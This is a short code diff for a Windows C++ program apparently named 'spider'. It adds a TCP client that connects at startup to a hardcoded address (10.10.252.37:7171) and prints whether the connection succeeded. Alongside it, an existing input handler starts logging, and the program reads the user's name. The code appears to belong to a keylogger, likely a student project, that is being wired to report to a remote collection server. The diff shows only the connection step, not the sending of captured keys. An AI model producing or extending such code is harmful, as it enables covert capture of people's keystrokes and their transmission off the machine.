@@ -8,6 +8,8 @@
 //#include "WindowsLogHandler.hpp"
 //#include "AutoStart.hpp"
 
+spider::socket::ClientTcpSocket tutu("10.10.252.37", 7171);
+
 void MessageLoop()
 {
 	MSG message;
@@ -34,6 +36,19 @@ int main(int ac, char **av)
 	//spider::WindowsLogHandler *tutu = new spider::WindowsLogHandler();
 	//tutu->createFile("logs");
 
+	WSADATA WSAData;
+	WSAStartup(MAKEWORD(2, 0), &WSAData);
+
+	tutu.connect();
+	if (tutu.startedService())
+	{
+		std::cout << "CONNECTED !" << std::endl;
+	}
+	else
+	{
+		std::cout << "NOT CONNECTED !" << std::endl;
+	}
+
 	spider::WindowsInputHandler *toto = new spider::WindowsInputHandler((LPVOID)av[0]);
 	toto->startLogging(true, true);
 
@@ -43,6 +58,8 @@ int main(int ac, char **av)
 	GetUserName((TCHAR*)userName, &userNameLength);
 
 	MessageLoop();
+
+	WSACleanup();
 	return 0;
 }
 
